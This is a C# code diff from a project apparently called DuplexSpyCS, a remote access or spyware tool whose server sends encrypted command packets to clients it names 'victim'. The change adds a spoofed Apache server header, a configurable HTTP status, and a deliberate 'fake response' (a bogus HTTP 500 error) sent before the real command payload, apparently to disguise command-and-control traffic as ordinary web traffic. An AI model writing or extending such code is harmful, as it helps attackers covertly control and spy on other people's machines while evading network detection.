@@ -33,40 +33,42 @@ namespace DuplexSpyCS
 
         public class clsHttpResp
         {
-            private string szBody { get; init; }
+            private string m_szStateCode = "200 OK";
+            private string m_szBody { get; init; }
 
             public clsHttpResp()
             {
-                szBody = string.Empty;
+                m_szBody = string.Empty;
             }
 
             public clsHttpResp(int nCmd, int nParam, string szMsg)
             {
                 clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
-                szBody = Convert.ToBase64String(dsp.GetBytes());
+                m_szBody = Convert.ToBase64String(dsp.GetBytes());
             }
 
             public clsHttpResp(int nCmd, int nParam, byte[] abMsg)
             {
                 clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, abMsg);
-                szBody = Convert.ToBase64String(dsp.GetBytes());
+                m_szBody = Convert.ToBase64String(dsp.GetBytes());
             }
 
-            public clsHttpResp(string szMsg)
+            public clsHttpResp(string szStateCode, string szMsg)
             {
-                szBody = szMsg;
+                m_szStateCode = szStateCode;
+                m_szBody = szMsg;
             }
 
-            public byte[] fnGetBytes() => fnGetBytes(szBody);
+            public byte[] fnGetBytes() => fnGetBytes(m_szBody);
             public byte[] fnGetBytes(byte[] abBuffer) => fnGetBytes(Convert.ToBase64String(abBuffer));
             public byte[] fnGetBytes(string szMsg)
             {
                 string szResp = $"" +
-                    $"HTTP/1.1 200 OK\r\n" +
+                    $"HTTP/1.1 {m_szStateCode}\r\n" +
                     $"Server: Apache/1.3.27\r\n" +
                     $"Content-Type: text/html\r\n" +
-                    $"content-length: {szBody.Length}\r\n\r\n" +
-                    $"{szBody}";
+                    $"content-length: {m_szBody.Length}\r\n\r\n" +
+                    $"{m_szBody}";
 
                 return Encoding.UTF8.GetBytes(szResp);
             }
@@ -148,6 +150,9 @@ namespace DuplexSpyCS
                 string szRsaPrivateKey = s[1];
 
                 victim.key_pairs = (szRsaPublicKey, szRsaPrivateKey);
+
+                //Fake response.
+                victim.Send(new clsHttpResp("500 Error", "HTTP 500://Server internal error.").fnGetBytes());
 
                 victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
 
